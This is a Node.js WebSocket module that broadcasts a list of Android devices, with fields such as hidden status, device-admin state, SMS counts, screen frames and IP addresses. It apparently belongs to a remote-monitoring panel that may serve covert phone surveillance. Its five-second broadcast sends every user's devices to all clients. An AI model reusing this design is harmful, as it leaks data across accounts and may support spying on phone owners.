'use strict';

const { WebSocketServer } = require('ws');
const { query } = require('./db');
const { verifyUserToken } = require('./auth');

const ONLINE_WINDOW_S = parseInt(process.env.ONLINE_WINDOW_S || '30', 10);

let wss = null;
let devicesTimer = null;

function normalizeDevices(rows) {
  return (rows || []).map((d) => ({
    id: d.id,
    device_uid: d.device_uid,
    label: d.label,
    model: d.model,
    manufacturer: d.manufacturer,
    android_release: d.android_release,
    sdk_int: d.sdk_int,
    app_version: d.app_version,
    is_online: !!d.is_online,
    hidden: !!d.hidden,
    admin_active: !!d.admin_active,
    battery: d.battery,
    ip_address: d.ip_address,
    last_seen: d.last_seen,
    created_at: d.created_at,
    permission_count: Number(d.permission_count || 0),
    sms_count: Number(d.sms_count || 0),
    sms_interval_s: d.sms_interval_s === undefined ? null : d.sms_interval_s,
    frame_available: !!d.frame_available,
  }));
}

// Build the devices list used by both REST and WS broadcasts.
async function buildDevices(userId) {
  const where = userId ? 'WHERE d.user_id = ?' : '';
  const params = userId ? [ONLINE_WINDOW_S, userId] : [ONLINE_WINDOW_S];
  const rows = await query(
    `SELECT d.id, d.device_uid, d.label, d.model, d.manufacturer, d.android_release,
            d.sdk_int, d.app_version, d.hidden, d.admin_active, d.battery, d.ip_address,
            d.sms_interval_s, d.created_at,
            (d.last_seen IS NOT NULL AND d.last_seen >= (NOW() - INTERVAL ? SECOND)) AS is_online,
            (SELECT COUNT(*) FROM device_permissions p WHERE p.device_id = d.id AND p.granted = 1) AS permission_count,
            (SELECT COUNT(*) FROM sms_messages s WHERE s.device_id = d.id) AS sms_count
       FROM devices d
       ${where}
       ORDER BY is_online DESC, d.id ASC`,
    params
  );
  return normalizeDevices(rows);
}

function broadcast(obj, userId) {
  if (!wss) return;
  const data = JSON.stringify(obj);
  for (const client of wss.clients) {
    if (client.readyState !== client.OPEN) continue;
    if (userId && client.userId && client.userId !== userId) continue;
    try {
      client.send(data);
    } catch (e) {
      /* ignore per-client send errors */
    }
  }
}

function attach(server) {
  wss = new WebSocketServer({ noServer: true });

  server.on('upgrade', (req, socket, head) => {
    let url;
    try {
      url = new URL(req.url, 'http://localhost');
    } catch (e) {
      socket.destroy();
      return;
    }
    if (url.pathname !== '/ws') {
      socket.destroy();
      return;
    }
    const token = url.searchParams.get('token');
    let payload;
    try {
      payload = verifyUserToken(token);
    } catch (e) {
      socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
      socket.destroy();
      return;
    }
    wss.handleUpgrade(req, socket, head, (ws) => {
      ws.userId = payload.sub;
      wss.emit('connection', ws, req);
    });
  });

  wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.on('pong', () => {
      ws.isAlive = true;
    });
    ws.on('message', () => {
      /* devices use HTTP polling; inbound WS messages ignored */
    });
  });

  // keepalive
  const interval = setInterval(() => {
    if (!wss) return;
    for (const ws of wss.clients) {
      if (ws.isAlive === false) {
        ws.terminate();
        continue;
      }
      ws.isAlive = false;
      try {
        ws.ping();
      } catch (e) {
        /* ignore */
      }
    }
  }, 30000);
  if (interval.unref) interval.unref();

  // broadcast devices every 5s
  devicesTimer = setInterval(async () => {
    try {
      const devices = await buildDevices(null);
      broadcast({ type: 'devices', devices });
    } catch (e) {
      /* ignore transient db errors in broadcast loop */
    }
  }, 5000);
  if (devicesTimer.unref) devicesTimer.unref();

  return wss;
}

function close() {
  if (devicesTimer) clearInterval(devicesTimer);
  if (wss) {
    for (const ws of wss.clients) {
      try {
        ws.close();
      } catch (e) {
        /* ignore */
      }
    }
    wss.close();
    wss = null;
  }
}

module.exports = { attach, broadcast, buildDevices, normalizeDevices, close };
